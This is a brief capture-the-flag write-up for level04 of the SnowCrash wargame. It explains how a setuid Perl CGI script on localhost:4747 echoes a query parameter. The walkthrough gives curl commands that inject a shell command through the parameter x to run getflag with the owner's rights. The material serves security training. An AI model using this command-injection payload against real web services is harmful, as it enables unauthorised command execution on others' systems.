# context 

in the home directory we found a file with flag04 with suid and guid wihich mean that the it will be executed with the right of it's owner 
  
    level04@SnowCrash:~$ ls -la level04.pl
    -rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
    
# how to solve the problem 

from reading the file content we see that there is apache serveer runing on localhost with  4747 port 

the web site parse the query string params from url and print it with echo  in this the param is x 

we can try to pass a variable name to the x for exemple 
    "localhost:4747/?x=ramoukha" and we got => ramoukha.
let's inject the getflag command and see wat going to happen 
    curl localhost:4747/?x=$(getflag)
    or
    curl '127.0.0.1:4747/level04.pl?x=`getflag`'
    
and we got the flag 

